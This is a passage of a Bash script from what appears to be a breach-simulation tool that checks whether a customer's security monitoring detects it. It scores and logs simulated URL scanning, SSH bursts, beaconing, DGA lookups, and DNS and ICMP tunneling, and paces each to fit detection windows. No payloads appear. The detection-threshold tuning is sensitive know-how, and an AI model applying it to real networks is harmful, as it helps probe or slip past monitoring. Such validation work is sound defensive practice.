POC_FOLLOWUP_ATTEMPTED=0
POC_FOLLOWUP_SKIPPED=0
POC_DISCOVERY_SERVICES_LOG=""
declare -gA POC_SKIP_REASON_COUNTS=()
declare -gA POC_STAGE_START_EPOCH=()
declare -gA POC_FAILURE_REASON_COUNTS=()
declare -gA POC_HTTP_STATUS_COUNTS=()
POC_EVIDENCE_DIR=""
POC_OBS_DEBUG=false

poc_extract_ipv4() {
    printf '%s' "${1:-}" | tr -d '\r\n\033' | grep -oE '([0-9]{1,3}\.){3}[0-9]{1,3}' | head -n1
}

poc_failure_reason_bump() {
    local reason="$1" n="${2:-1}"
    [[ -n "${reason}" ]] || return 0
    POC_FAILURE_REASON_COUNTS["${reason}"]=$((${POC_FAILURE_REASON_COUNTS["${reason}"]:-0} + n))
}

poc_http_status_bump() {
    local code="$1" n="${2:-1}"
    [[ -n "${code}" ]] || return 0
    POC_HTTP_STATUS_COUNTS["${code}"]=$((${POC_HTTP_STATUS_COUNTS["${code}"]:-0} + n))
}

poc_accumulate_http_scan_status_counts() {
    local cnt_200="$1" cnt_301="$2" cnt_302="$3" cnt_401="$4" cnt_400="$5" cnt_403="$6" cnt_404="$7" cnt_405="$8"
    local cnt_failed="$9" cnt_success="${10}" cnt_attempted="${11}" cnt_responses="${12}"
    cnt_200=$(safe_int "${cnt_200}")
    cnt_301=$(safe_int "${cnt_301}")
    cnt_302=$(safe_int "${cnt_302}")
    cnt_401=$(safe_int "${cnt_401}")
    cnt_400=$(safe_int "${cnt_400}")
    cnt_403=$(safe_int "${cnt_403}")
    cnt_404=$(safe_int "${cnt_404}")
    cnt_405=$(safe_int "${cnt_405}")
    cnt_failed=$(safe_int "${cnt_failed}")
    cnt_success=$(safe_int "${cnt_success}")
    cnt_attempted=$(safe_int "${cnt_attempted}")
    cnt_responses=$(safe_int "${cnt_responses}")
    (( cnt_200 > 0 )) && poc_http_status_bump "200" "${cnt_200}"
    (( cnt_301 > 0 )) && poc_http_status_bump "301" "${cnt_301}"
    (( cnt_302 > 0 )) && poc_http_status_bump "302" "${cnt_302}"
    (( cnt_401 > 0 )) && poc_http_status_bump "401" "${cnt_401}"
    (( cnt_400 > 0 )) && poc_http_status_bump "400" "${cnt_400}"
    (( cnt_403 > 0 )) && poc_http_status_bump "403" "${cnt_403}"
    (( cnt_404 > 0 )) && poc_http_status_bump "404" "${cnt_404}"
    (( cnt_405 > 0 )) && poc_http_status_bump "405" "${cnt_405}"
    (( cnt_failed > 0 )) && poc_failure_reason_bump "HTTP scan failed responses" "${cnt_failed}"
    (( cnt_success > 0 )) && poc_failure_reason_bump "HTTP scan success responses" "${cnt_success}"
    (( cnt_attempted > cnt_responses )) && poc_failure_reason_bump "HTTP timeout/no response" $((cnt_attempted - cnt_responses))
}

safe_poc_accumulate_http_scan_status_counts() {
    local _rc=0
    poc_accumulate_http_scan_status_counts "$@" || _rc=$?
    if (( _rc != 0 )); then
        log_message "WARN" "HTTP scan status aggregate non-fatal error (rc=${_rc}) — URL scan continues" >&2
    fi
    return 0
}

poc_customer_append() {
    local file="$1" line="$2"
    [[ -n "${file}" && -n "${line}" ]] || return 0
    printf '%s\n' "${line}" >> "${file}" 2>/dev/null || true
}

poc_customer_emit_block() {
    local line
    for line in "$@"; do
        [[ -z "${line}" ]] && continue
        poc_obs_append_log "${line}"
        poc_customer_append "${POC_CUSTOMER_REPORT}" "${line}"
    done
}

poc_customer_validation_emit() {
    local line
    for line in "$@"; do
        [[ -z "${line}" ]] && continue
        poc_obs_append_log "${line}"
        poc_customer_append "${POC_CUSTOMER_LOG}" "${line}"
        poc_customer_append "${POC_CUSTOMER_VALIDATION}" "${line}"
    done
}

log_http_url_scan_target_summary() {
    local target="$1" requests="$2" responses="$3"
    local cnt_200="$4" cnt_301="$5" cnt_302="$6" cnt_400="$7" cnt_401="$8"
    local cnt_403="$9" cnt_404="${10}" cnt_405="${11}" cnt_500="${12}" cnt_timeout="${13}"
    local cnt_failed="${14}" cnt_success="${15}" fail_ratio="${16}" success_ratio=0
    local block="" msg=""
    requests=$(safe_int "${requests}")
    responses=$(safe_int "${responses}")
    cnt_200=$(safe_int "${cnt_200}")
    cnt_301=$(safe_int "${cnt_301}")
    cnt_302=$(safe_int "${cnt_302}")
    cnt_400=$(safe_int "${cnt_400}")
    cnt_401=$(safe_int "${cnt_401}")
    cnt_403=$(safe_int "${cnt_403}")
    cnt_404=$(safe_int "${cnt_404}")
    cnt_405=$(safe_int "${cnt_405}")
    cnt_500=$(safe_int "${cnt_500}")
    cnt_timeout=$(safe_int "${cnt_timeout}")
    cnt_failed=$(safe_int "${cnt_failed}")
    cnt_success=$(safe_int "${cnt_success}")
    fail_ratio=$(safe_int "${fail_ratio}")
    (( requests > 0 )) && success_ratio=$((cnt_success * 100 / requests))
    block="HTTP_URL_SCAN_TARGET_SUMMARY

target=${target}
requests=${requests}
responses=${responses}
http_200=${cnt_200}
http_301=${cnt_301}
http_302=${cnt_302}
http_400=${cnt_400}
http_401=${cnt_401}
http_403=${cnt_403}
http_404=${cnt_404}
http_405=${cnt_405}
http_500=${cnt_500}
timeout=${cnt_timeout}
success=${cnt_success}
failed=${cnt_failed}
success_ratio=${success_ratio}%
fail_ratio=${fail_ratio}%"
    msg="HTTP_URL_SCAN_TARGET_SUMMARY target=${target} requests=${requests} responses=${responses} http_200=${cnt_200} http_301=${cnt_301} http_302=${cnt_302} http_400=${cnt_400} http_401=${cnt_401} http_403=${cnt_403} http_404=${cnt_404} http_405=${cnt_405} http_500=${cnt_500} timeout=${cnt_timeout} success=${cnt_success} failed=${cnt_failed} success_ratio=${success_ratio}% fail_ratio=${fail_ratio}%"
    state_append "http_url_scan_target_summary.log" "${msg}"
    log_message "OK" "${msg}" >&2
    poc_customer_emit_block "${block}"
}

log_detection_quality() {
    local stage="$1" events="$2" duration="$3" targets="$4" classification="$5" quality="$6" reason="$7"
    local block=""
    block="DETECTION_QUALITY

stage=${stage}
events_generated=${events}
duration=${duration}
targets=${targets}
classification=${classification}
quality=${quality}

reason=${reason}"
    state_append "detection_quality.log" "stage=${stage} events=${events} duration=${duration} targets=${targets} classification=${classification} quality=${quality} reason=${reason}"
    log_message "OK" "DETECTION_QUALITY stage=${stage} quality=${quality} reason=${reason}" >&2
    poc_customer_emit_block "${block}"
}

log_detection_score() {
    local module="$1" score="$2" reason="$3"
    local block=""
    score=$(safe_int "${score}")
    (( score < 0 )) && score=0
    (( score > 100 )) && score=100
    block="DETECTION_SCORE

${module}=${score}
reason=${reason}"
    state_append "detection_score.log" "module=${module} score=${score} reason=${reason}"
    log_message "OK" "DETECTION_SCORE ${module}=${score} reason=${reason}" >&2
    poc_customer_emit_block "${block}"
    case "${module}" in
        HTTP_URL_SCAN) DETECTION_SCORE_HTTP_URL_SCAN="${score}" ;;
        BEACON) DETECTION_SCORE_BEACON="${score}" ;;
        DGA) DETECTION_SCORE_DGA="${score}" ;;
        DNS_TUNNEL) DETECTION_SCORE_DNS_TUNNEL="${score}" ;;
        ICMP_TUNNEL) DETECTION_SCORE_ICMP_TUNNEL="${score}" ;;
    esac
}

compute_detection_score_http_url_scan() {
    local attempted="${1:-${HTTP_REQUESTS_ATTEMPTED:-0}}" real_failed="${2:-${HTTP_URL_SCAN_REAL_FAILED:-0}}"
    local target_count="${3:-1}" duration="${4:-${HTTP_SCAN_WINDOW_SECONDS:-0}}"
    local score=0 reason=""
    attempted=$(safe_int "${attempted}")
    real_failed=$(safe_int "${real_failed}")
    target_count=$(safe_int "${target_count}")
    duration=$(safe_int "${duration}")
    (( target_count < 1 )) && target_count=1
    score=$((attempted * 60 / 100))
    (( real_failed >= 30 )) && score=$((score + 20))
    (( real_failed >= 50 )) && score=$((score + 10))
    (( target_count == 1 && attempted >= 40 )) && score=$((score + 15))
    (( score > 100 )) && score=100
    reason="${attempted} requests concentrated against ${target_count} target(s) within ${duration}s window"
    log_detection_score "HTTP_URL_SCAN" "${score}" "${reason}"
}

compute_detection_score_beacon() {
    local attempted="${1:-${EXTERNAL_CALLBACK_ATTEMPTED:-0}}" connected="${2:-${EXTERNAL_CALLBACK_CONNECTED:-0}}"
    local ratio=0 score=0 reason=""
    attempted=$(safe_int "${attempted}")
    connected=$(safe_int "${connected}")
    (( attempted > 0 )) && ratio=$((connected * 100 / attempted))
    BEACON_CALLBACK_RATIO="${ratio}"
    score=$((attempted * 40 / 100 + ratio / 5))
    (( BEACON_LOW_SLOW_ATTEMPTED >= 15 )) && score=$((score + 15))
    (( BEACON_BURST_ATTEMPTED >= 30 )) && score=$((score + 15))
    (( score > 100 )) && score=100
    reason="callback_ratio=${ratio}% low_slow=${BEACON_LOW_SLOW_ATTEMPTED} burst=${BEACON_BURST_ATTEMPTED} connected=${connected}"
    log_detection_score "BEACON" "${score}" "${reason}"
}

compute_detection_score_dga() {
    local nx="${1:-${DGA_NXDOMAIN_COUNT:-0}}" total="${2:-${DGA_TOTAL_QUERIES:-0}}" resolved="${3:-${DGA_RESOLVED_COUNT:-0}}"
    local score=0 reason=""
    nx=$(safe_int "${nx}")
    total=$(safe_int "${total}")
    resolved=$(safe_int "${resolved}")
    score=$((nx * 80 / 100))
    (( resolved >= 1 )) && score=$((score + 10))
    (( total >= 80 )) && score=$((score + 10))
    (( score > 100 )) && score=100
    reason="nxdomain=${nx} total_queries=${total} resolved=${resolved}"
    log_detection_score "DGA" "${score}" "${reason}"
}

compute_detection_score_dns_tunnel() {
    local queries="${1:-${DNS_QUERIES_ATTEMPTED:-0}}" entropy="${2:-${DNS_TUNNEL_APPROX_ENTROPY:-0}}"
    local score=0 reason=""
    queries=$(safe_int "${queries}")
    entropy=$(safe_int "${entropy}")
    score=$((queries * 50 / 300))
    (( entropy >= 45 )) && score=$((score + 25))
    (( entropy >= 30 )) && score=$((score + 10))
    (( queries >= 200 )) && score=$((score + 15))
    (( score > 100 )) && score=100
    reason="${queries} DNS tunnel queries with entropy_score=${entropy} likelihood=${DNS_TUNNEL_DETECTION_LIKELIHOOD:-LOW}"
    log_detection_score "DNS_TUNNEL" "${score}" "${reason}"
}

compute_detection_score_icmp_tunnel() {
    local sent="${1:-${ICMP_PACKETS_ATTEMPTED:-0}}" avg_payload="${2:-${ICMP_PAYLOAD_SIZE_AVG:-0}}"
    local score=0 reason=""
    sent=$(safe_int "${sent}")
    avg_payload=$(safe_int "${avg_payload}")
    score=$((avg_payload * 50 / 1400))
    (( sent >= 100 )) && score=$((score + 25))
    (( sent >= 50 )) && score=$((score + 10))
    (( avg_payload >= 1200 )) && score=$((score + 15))
    (( score > 100 )) && score=100
    reason="sent=${sent} payload_size_avg=${avg_payload} payload_size_max=${ICMP_PAYLOAD_SIZE_MAX:-0} large_payload_ratio=${ICMP_LARGE_PAYLOAD_RATIO:-0}% duration=${ICMP_TUNNEL_DURATION_ELAPSED:-0}s likelihood=${ICMP_DETECTION_LIKELIHOOD:-LOW}"
    log_detection_score "ICMP_TUNNEL" "${score}" "${reason}"
}

log_beacon_summary() {
    local mode="$1" attempted="$2" success="$3" failed="$4" callback_ratio="$5"
    local block=""
    block="BEACON_SUMMARY

mode=${mode}
attempted=${attempted}
success=${success}
failed=${failed}
callback_ratio=${callback_ratio}%"
    state_append "beacon_summary.log" "mode=${mode} attempted=${attempted} success=${success} failed=${failed} callback_ratio=${callback_ratio}%"
    log_message "OK" "BEACON_SUMMARY mode=${mode} attempted=${attempted} success=${success} failed=${failed} callback_ratio=${callback_ratio}%" >&2
    poc_customer_emit_block "${block}"
}

resolve_dga_failure_reason_code() {
    local resolver="${1:-${DGA_DNS_SERVER:-unknown}}" dns_server="${2:-${DGA_DNS_SERVER:-unknown}}"
    local queries_attempted="${3:-${DGA_QUERIES_ATTEMPTED:-0}}" queries_sent="${4:-${DGA_QUERIES_SENT:-0}}"
    local responses="${5:-0}" nxdomain="${6:-${DGA_NXDOMAIN_COUNT:-0}}" timeout="${7:-${DGA_TIMEOUT_COUNT:-0}}"
    if [[ "${DGA_SKIP_REASON}" == "dns_resolver_unavailable" && -z "${DGA_DNS_SERVER}" && DGA_TOTAL_QUERIES -eq 0 ]]; then
        printf 'no_dns_connectivity'
        return 0
    fi
    if (( queries_sent == 0 && queries_attempted == 0 )); then
        printf 'dig_nslookup_host_unavailable'
        return 0
    fi
    if (( timeout > 0 && nxdomain == 0 && responses == 0 )); then
        printf 'dns_server_refused_queries'
        return 0
    fi
    if (( queries_sent > 0 && nxdomain == 0 && responses == 0 )); then
        printf 'no_nxdomain_responses'
        return 0
    fi
    if (( DGA_RESOLVED_COUNT == 0 && nxdomain > 0 )); then
        printf 'resolvable_phase_no_ip'
        return 0
    fi
    printf '%s' "${DGA_SKIP_REASON:-dga_simulation_failed}"
}

log_dga_failure_analysis() {
    local reason="" block=""
    reason=$(resolve_dga_failure_reason_code)
    DGA_FAILURE_REASON="${reason}"
    block="DGA_FAILURE_ANALYSIS

resolver=${DGA_QUERY_TOOL:-unknown}
dns_server=${DGA_DNS_SERVER:-unknown}
queries_attempted=${DGA_QUERIES_ATTEMPTED:-${DGA_TOTAL_QUERIES:-0}}
queries_sent=${DGA_QUERIES_SENT:-${DGA_TOTAL_QUERIES:-0}}
responses=${DGA_RESOLVED_COUNT:-0}
nxdomain=${DGA_NXDOMAIN_COUNT:-0}
timeout=${DGA_TIMEOUT_COUNT:-0}
reason=${reason}"
    state_append "dga_failure_analysis.log" "resolver=${DGA_QUERY_TOOL:-unknown} dns_server=${DGA_DNS_SERVER:-unknown} reason=${reason}"
    log_message "WARN" "DGA_FAILURE_ANALYSIS reason=${reason} dns_server=${DGA_DNS_SERVER:-unknown}" >&2
    poc_customer_emit_block "${block}"
}

normalize_final_validation_status() {
    local raw="$1"
    case "${raw,,}" in
        success|passed|pass) printf 'success' ;;
        partial|warn|degraded) printf 'partial' ;;
        skipped) printf 'skipped' ;;
        *) printf 'failed' ;;
    esac
}

lookup_stage_result_status() {
    local label="$1" line status=""
    line=$(read_state_file_or_none "stage_results.log" | grep -F "${label}:" | tail -n1 || true)
    [[ -z "${line}" ]] && { printf 'unknown'; return 0; }
    status="${line#*: }"
    status="${status%% |*}"
    normalize_final_validation_status "${status}"
}

compute_and_log_final_validation() {
    local block="" success_count=0 partial_count=0 failed_count=0 total_required=0
    compute_final_telemetry_validation

    FINAL_VAL_SERVICE_DISCOVERY=$(lookup_stage_result_status "Service Discovery")
    [[ "${FINAL_VAL_SERVICE_DISCOVERY}" == unknown && "${SERVICES_DISCOVERED_TOTAL:-0}" -gt 0 ]] && FINAL_VAL_SERVICE_DISCOVERY="success"
    FINAL_VAL_HTTP_FOLLOWUP=$(normalize_final_validation_status "${TELEMETRY_VAL_HTTP_URL_SCAN:-${HTTP_URL_SCAN_STAGE_STATUS:-skipped}}")
    FINAL_VAL_SSH_FOLLOWUP=$(lookup_stage_result_status "SSH Auth Burst")
    [[ "${FINAL_VAL_SSH_FOLLOWUP}" == unknown ]] && FINAL_VAL_SSH_FOLLOWUP=$(lookup_stage_result_status "SSH Follow-up")
    FINAL_VAL_DNS_TUNNEL=$(normalize_final_validation_status "${TELEMETRY_VAL_DNS_TUNNEL:-${DNS_TUNNEL_STAGE_STATUS:-skipped}}")
    FINAL_VAL_ICMP_TUNNEL=$(normalize_final_validation_status "${TELEMETRY_VAL_ICMP_TUNNEL:-${ICMP_TUNNEL_STAGE_STATUS:-skipped}}")
    FINAL_VAL_DGA=$(normalize_final_validation_status "${TELEMETRY_VAL_DGA_SIMULATION:-${DGA_STAGE_STATUS:-skipped}}")
    FINAL_VAL_BEACON=$(lookup_stage_result_status "Beaconing")
    [[ "${FINAL_VAL_BEACON}" == unknown ]] && FINAL_VAL_BEACON=$(normalize_final_validation_status "${EXTERNAL_CALLBACK_STATUS:-skipped}")
    FINAL_VAL_EXTERNAL_CALLBACK=$(normalize_final_validation_status "${TELEMETRY_VAL_EXTERNAL_CALLBACK:-${EXTERNAL_CALLBACK_STATUS:-skipped}}")

    for _s in "${FINAL_VAL_HTTP_FOLLOWUP}" "${FINAL_VAL_SSH_FOLLOWUP}" "${FINAL_VAL_DNS_TUNNEL}" \
              "${FINAL_VAL_ICMP_TUNNEL}" "${FINAL_VAL_DGA}" "${FINAL_VAL_BEACON}" "${FINAL_VAL_EXTERNAL_CALLBACK}"; do
        [[ "${_s}" == skipped ]] && continue
        total_required=$((total_required + 1))
        case "${_s}" in
            success) success_count=$((success_count + 1)) ;;
            partial) partial_count=$((partial_count + 1)) ;;
            *) failed_count=$((failed_count + 1)) ;;
        esac
    done

    if (( failed_count == 0 && partial_count == 0 && success_count >= 4 )); then
        OVERALL_RESULT="Success"
        DETECTION_CONFIDENCE_OVERALL="high"
    elif (( failed_count == 0 && success_count >= 2 )); then
        OVERALL_RESULT="Partial"
        DETECTION_CONFIDENCE_OVERALL="medium"
    elif (( success_count >= 1 )); then
        OVERALL_RESULT="Partial"
        DETECTION_CONFIDENCE_OVERALL="low"
    else
        OVERALL_RESULT="Failed"
        DETECTION_CONFIDENCE_OVERALL="low"
    fi
    if (( failed_count > 2 )); then
        OVERALL_RESULT="Failed"
        DETECTION_CONFIDENCE_OVERALL="low"
    fi

    block="FINAL_VALIDATION

service_discovery=${FINAL_VAL_SERVICE_DISCOVERY}
http_followup=${FINAL_VAL_HTTP_FOLLOWUP}
ssh_followup=${FINAL_VAL_SSH_FOLLOWUP}
dns_tunnel=${FINAL_VAL_DNS_TUNNEL}
icmp_tunnel=${FINAL_VAL_ICMP_TUNNEL}
dga=${FINAL_VAL_DGA}
beacon=${FINAL_VAL_BEACON}
external_callback=${FINAL_VAL_EXTERNAL_CALLBACK}

OVERALL_RESULT=${OVERALL_RESULT}"
    poc_customer_validation_emit "${block}"
    state_append "final_validation.log" "overall=${OVERALL_RESULT} http=${FINAL_VAL_HTTP_FOLLOWUP} dga=${FINAL_VAL_DGA} beacon=${FINAL_VAL_BEACON} dns=${FINAL_VAL_DNS_TUNNEL}"
    log_message "OK" "FINAL_VALIDATION OVERALL_RESULT=${OVERALL_RESULT}" >&2
}

log_http_url_scan_target_selection() {
    local candidate_count="$1" selected="$2" reason="$3"
    local probe_400="$4" probe_403="$5" probe_404="$6" probe_success="$7" probe_timeout="$8"
    local msg="HTTP_URL_SCAN_TARGET_SELECTION candidate_count=${candidate_count} selected=${selected} reason=${reason} probe_400=${probe_400} probe_403=${probe_403} probe_404=${probe_404} probe_success=${probe_success} probe_timeout=${probe_timeout}"
    state_append "http_url_scan_target_selection.log" "${msg}"
    log_message "OK" "${msg}" >&2
}

log_http_url_scan_auth_required_continue() {
    local target="$1" status="$2"
    local msg="HTTP_URL_SCAN_AUTH_REQUIRED_CONTINUE target=${target} status=${status} decision=continue_url_scan reason=auth_required_responses_are_valid_failed_url_telemetry"
    state_append "http_url_scan_auth_required.log" "${msg}"
    log_message "OK" "${msg}" >&2
}

compute_http_url_scan_detection_likelihood() {
    local total="$1" real_failed="$2" fail_ratio="$3"
    local http_400="$4" http_401="$5" http_403="$6" http_404="$7" http_405="$8" http_500="$9" timeout="${10}"
    local real_fail_codes=0
    total=$(safe_int "${total}")
    real_failed=$(safe_int "${real_failed}")
    fail_ratio=$(safe_int "${fail_ratio}")
    http_400=$(safe_int "${http_400}")
    http_401=$(safe_int "${http_401}")
    http_403=$(safe_int "${http_403}")
    http_404=$(safe_int "${http_404}")
    http_405=$(safe_int "${http_405}")
    http_500=$(safe_int "${http_500}")
    timeout=$(safe_int "${timeout}")
    real_fail_codes=$((http_400 + http_401 + http_403 + http_404 + http_405 + http_500 + timeout))
    if (( total >= 40 && real_failed >= 32 && fail_ratio >= 80 && real_fail_codes >= 32 )); then
        HTTP_URL_SCAN_DETECTION_LIKELIHOOD="high"
        HTTP_URL_SCAN_FINAL_REASON="concentrated burst met high threshold (total>=40 real_failed>=32 fail_ratio>=80% status_failures>=32)"
        return 0
    fi
    if (( total >= 30 && real_failed >= 20 && fail_ratio >= 60 )); then
        HTTP_URL_SCAN_DETECTION_LIKELIHOOD="medium"
        HTTP_URL_SCAN_FINAL_REASON="concentrated burst met medium threshold (total>=30 real_failed>=20 fail_ratio>=60%)"
        return 0
    fi
    HTTP_URL_SCAN_DETECTION_LIKELIHOOD="low"
    HTTP_URL_SCAN_FINAL_REASON="concentrated burst below medium threshold (total=${total} real_failed=${real_failed} fail_ratio=${fail_ratio}%)"
}

log_http_url_scan_final_summary() {
    local selected_target="$1" total="$2" success="$3" real_failed="$4" synthetic_failed="$5"
    local redirect_count="$6" http_400="$7" http_401="$8" http_403="$9" http_404="${10}" http_405="${11}" http_500="${12}" timeout="${13}"
    local fail_ratio=0 core_http=0 logic_err="" msg=""
    total=$(safe_int "${total}")
    success=$(safe_int "${success}")
    real_failed=$(safe_int "${real_failed}")
    synthetic_failed=$(safe_int "${synthetic_failed}")
    redirect_count=$(safe_int "${redirect_count}")
    http_400=$(safe_int "${http_400}")
    http_401=$(safe_int "${http_401}")
    http_403=$(safe_int "${http_403}")
    http_404=$(safe_int "${http_404}")
    http_405=$(safe_int "${http_405}")
    http_500=$(safe_int "${http_500}")
    timeout=$(safe_int "${timeout}")
    (( total > 0 )) && fail_ratio=$((real_failed * 100 / total))
    core_http=$((http_400 + http_403 + http_404 + http_500))
    if (( core_http == 0 && (real_failed + synthetic_failed) >= 32 )); then
        logic_err="HTTP_URL_SCAN_LOGIC_ERROR selected_target=${selected_target} total_requests=${total} aggregate_failed=$((real_failed + synthetic_failed)) http_400=${http_400} http_403=${http_403} http_404=${http_404} http_500=${http_500} detail=synthetic_or_legacy_failed_without_status_counters"
        state_append "http_url_scan_final_summary.log" "${logic_err}"
        log_message "ERROR" "${logic_err}" >&2
        HTTP_URL_SCAN_DETECTION_LIKELIHOOD="low"
        HTTP_URL_SCAN_FINAL_REASON="logic_error aggregate_failures_without_http_status_counters"
    else
        compute_http_url_scan_detection_likelihood "${total}" "${real_failed}" "${fail_ratio}" \
            "${http_400}" "${http_401}" "${http_403}" "${http_404}" "${http_405}" "${http_500}" "${timeout}"
    fi
    HTTP_URL_SCAN_REAL_FAILED="${real_failed}"
    HTTP_URL_SCAN_SYNTHETIC_FAILED="${synthetic_failed}"
    HTTP_URL_SCAN_REDIRECT_COUNT="${redirect_count}"
    HTTP_URL_SCAN_TIMEOUT_COUNT="${timeout}"
    HTTP_URL_SCAN_HTTP_500="${http_500}"
    DETECTION_LIKELIHOOD_URL_SCAN="${HTTP_URL_SCAN_DETECTION_LIKELIHOOD:-low}"
    msg="HTTP_URL_SCAN_FINAL_SUMMARY selected_target=${selected_target} total_requests=${total} success=${success} real_failed=${real_failed} synthetic_failed=${synthetic_failed} redirect_count=${redirect_count} http_400=${http_400} http_401=${http_401} http_403=${http_403} http_404=${http_404} http_405=${http_405} http_500=${http_500} timeout=${timeout} fail_ratio=${fail_ratio} detection_likelihood=${HTTP_URL_SCAN_DETECTION_LIKELIHOOD} detection_likelihood_url_scan=${DETECTION_LIKELIHOOD_URL_SCAN} detection_likelihood_malicious_ua=${DETECTION_LIKELIHOOD_MALICIOUS_UA:-low} reason=${HTTP_URL_SCAN_FINAL_REASON}"
    state_append "http_url_scan_final_summary.log" "${msg}"
    log_message "OK" "${msg}" >&2
}

log_detection_window_plan() {
    local module="$1" target="$2" window_seconds="$3" required_events="$4" planned_events="$5" reason="$6"
    local msg="DETECTION_WINDOW_PLAN module=${module} target=${target} window_seconds=${window_seconds} required_events=${required_events} planned_events=${planned_events} reason=${reason}"
    state_append "detection_window.log" "${msg}"
    log_message "OK" "${msg}" >&2
}

log_detection_window_progress() {
    local module="$1" target="$2" elapsed_seconds="$3" events_sent="$4" required_events="$5" condition_met="$6"
    local msg="DETECTION_WINDOW_PROGRESS module=${module} target=${target} elapsed_seconds=${elapsed_seconds} events_sent=${events_sent} required_events=${required_events} condition_met=${condition_met}"
    state_append "detection_window.log" "${msg}"
    log_message "OK" "${msg}" >&2
}

log_detection_window_summary() {
    local module="$1" target="$2" elapsed_seconds="$3" actual_events="$4" required_events="$5"
    local condition_met="$6" detection_likelihood="$7" reason="$8"
    local msg="DETECTION_WINDOW_SUMMARY module=${module} target=${target} elapsed_seconds=${elapsed_seconds} actual_events=${actual_events} required_events=${required_events} condition_met=${condition_met} detection_likelihood=${detection_likelihood} reason=${reason}"
    state_append "detection_window.log" "${msg}"
    log_message "OK" "${msg}" >&2
}

ingest_detection_window_progress_from_output() {
    local out="$1" module="$2" target="$3" required_events="$4"
    local line elapsed events met
    while IFS= read -r line; do
        [[ "${line}" != DETECTION_WINDOW_PROGRESS* ]] && continue
        elapsed=$(safe_int "$(sed -n 's/.*elapsed_seconds=\([0-9][0-9]*\).*/\1/p' <<< "${line}")")
        events=$(safe_int "$(sed -n 's/.*events_sent=\([0-9][0-9]*\).*/\1/p' <<< "${line}")")
        met=$(sed -n 's/.*condition_met=\([^ ]*\).*/\1/p' <<< "${line}")
        [[ -z "${met}" ]] && met=no
        log_detection_window_progress "${module}" "${target}" "${elapsed}" "${events}" "${required_events}" "${met}"
    done <<< "$(printf '%s\n' "${out}" | tr -d '\r' | grep '^DETECTION_WINDOW_PROGRESS' || true)"
}

resolve_http_detection_window_plan() {
    # Stellar 5-minute aggregation bucket: concentrate unique URL + 4xx telemetry on one host in 20-60s.
    case "${POC_INTENSITY}" in
        light) HTTP_SCAN_WINDOW_SECONDS=50 ;;
        high|spike) HTTP_SCAN_WINDOW_SECONDS=30 ;;
        *) HTTP_SCAN_WINDOW_SECONDS=40 ;;
    esac
    (( HTTP_SCAN_WINDOW_SECONDS < 20 )) && HTTP_SCAN_WINDOW_SECONDS=20
    (( HTTP_SCAN_WINDOW_SECONDS > 60 )) && HTTP_SCAN_WINDOW_SECONDS=60
    HTTP_SCAN_WAVE_SLEEP=0
    HTTP_SCAN_WAVES=1
    HTTP_SCAN_INTER_REQUEST_SLEEP=0
    HTTP_SCAN_WAVE_ATTEMPT_CAP=120
    HTTP_SCAN_RECON_MIN_FAILED="${HTTP_SCAN_WINDOW_MIN_FAILED}"
    if (( HTTP_SCAN_UNIQUE_URL_TARGET < 40 )); then
        HTTP_SCAN_UNIQUE_URL_TARGET=40
    elif (( HTTP_SCAN_UNIQUE_URL_TARGET > 80 )); then
        HTTP_SCAN_UNIQUE_URL_TARGET=80
    fi
}

resolve_dns_detection_window_plan() {
    local planned="${1:-${DNS_BURST_COUNT:-${DNS_TUNNEL_QUERY_COUNT}}}"
    planned=$(safe_int "${planned}")
    (( planned < DNS_TUNNEL_MIN_QUERIES )) && planned="${DNS_TUNNEL_MIN_QUERIES}"
    (( planned > DNS_TUNNEL_MAX_QUERIES )) && planned="${DNS_TUNNEL_MAX_QUERIES}"
    DETECTION_WINDOW_DNS_QUERIES="${planned}"
    DETECTION_WINDOW_DNS_WINDOW_SECONDS=90
    (( DETECTION_WINDOW_DNS_WINDOW_SECONDS < 60 )) && DETECTION_WINDOW_DNS_WINDOW_SECONDS=60
    (( DETECTION_WINDOW_DNS_WINDOW_SECONDS > 120 )) && DETECTION_WINDOW_DNS_WINDOW_SECONDS=120
    # Pace queries to finish inside the 1-2 minute detection window (single resolver burst).
    DNS_TUNNEL_SLEEP_MS=$((DETECTION_WINDOW_DNS_WINDOW_SECONDS * 1000 / planned / 3))
    DNS_TUNNEL_JITTER_MS=$((DNS_TUNNEL_SLEEP_MS / 2))
    (( DNS_TUNNEL_SLEEP_MS < 20 )) && DNS_TUNNEL_SLEEP_MS=20
    (( DNS_TUNNEL_JITTER_MS < 10 )) && DNS_TUNNEL_JITTER_MS=10
    printf '%s' "${planned}"
}

resolve_dga_detection_window_plan() {
    local nx="${1:-${DGA_NXDOMAIN_QUERIES}}"
    nx=$(safe_int "${nx}")
    (( nx < 250 )) && nx=250
    (( nx > 300 )) && nx=300
    DGA_NXDOMAIN_QUERIES="${nx}"
    # B-plan: execution may target nx>=250 but detection window success uses nx>=150
    (( DETECTION_WINDOW_DGA_NXDOMAIN < 150 )) && DETECTION_WINDOW_DGA_NXDOMAIN=150
    DETECTION_WINDOW_DGA_WINDOW_SECONDS=90
    printf '%s' "${nx}"
}

resolve_dga_resolvable_query_plan() {
    local n="${1:-${DGA_RESOLVABLE_QUERIES}}"
    n=$(safe_int "${n}")
    (( n < 5 )) && n=5
    (( n > 8 )) && n=8
    DGA_RESOLVABLE_QUERIES="${n}"
    printf '%s' "${n}"
}

resolve_icmp_detection_window_plan() {
    local n="${1:-${ICMP_PACKET_COUNT}}"
    n=$(safe_int "${n}")
    (( n < 80 )) && n=80
    (( n > 120 )) && n=120
    DETECTION_WINDOW_ICMP_PACKETS="${n}"
    DETECTION_WINDOW_ICMP_WINDOW_SECONDS=300
    ICMP_PACKET_COUNT="${n}"
    printf '%s' "${n}"
}

http_url_scan_window_condition_met() {
    local unique_attempted="$1" real_failed="$2" required_unique="$3" required_failed="$4"
    unique_attempted=$(safe_int "${unique_attempted}")
    real_failed=$(safe_int "${real_failed}")
    required_unique=$(safe_int "${required_unique}")
    required_failed=$(safe_int "${required_failed}")
    (( unique_attempted >= required_unique && real_failed >= required_failed )) && return 0
    return 1
}

malicious_ua_window_condition_met() {
    local ua_total="$1" ua_abnormal="$2"
    ua_total=$(safe_int "${ua_total}")
    ua_abnormal=$(safe_int "${ua_abnormal}")
    (( ua_total >= 40 && ua_abnormal >= 40 )) && return 0
    return 1
}

dns_tunnel_window_condition_met() {
    local attempted="$1" required="$2"
    attempted=$(safe_int "${attempted}")
    required=$(safe_int "${required}")
    (( attempted >= required )) && return 0
    return 1
}

dga_window_condition_met() {
    local nx="$1" resolved="$2" required_nx="$3" likelihood="${4:-${DGA_DETECTION_LIKELIHOOD:-LOW}}"
    local sent random_domains
    nx=$(safe_int "${nx}")
    resolved=$(safe_int "${resolved}")
